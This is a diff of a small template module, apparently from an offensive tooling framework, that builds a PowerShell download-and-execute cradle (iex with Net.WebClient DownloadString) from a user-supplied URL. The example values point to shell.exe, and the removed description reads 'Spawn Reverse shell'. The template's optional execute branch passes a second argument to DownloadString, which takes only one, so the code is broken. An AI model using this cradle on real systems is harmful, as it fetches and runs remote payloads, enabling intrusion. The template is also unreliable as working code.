@@ -1,10 +1,10 @@
 ##########
-Name: Download file from url
+Name: download-http
 Author: Jusmistic
-Description: Spawn Reverse shell
+Description: Download file from url
 Options:
-    url: http://127.0.0.1/shell.exe
-    execute: False
-    filename: shell.exe
+    url: "File's URL (Ex: http://127.0.0.1/shell.exe)"
+    execute: "Execute downloaded file? (Ex. False)"
+    filename: "Filename to execute (Ex:shell.exe)"
 ##########
 iex (New-Object Net.WebClient).DownloadString('{{url}}'{% if execute %}, '{{filename}}'{% endif %});
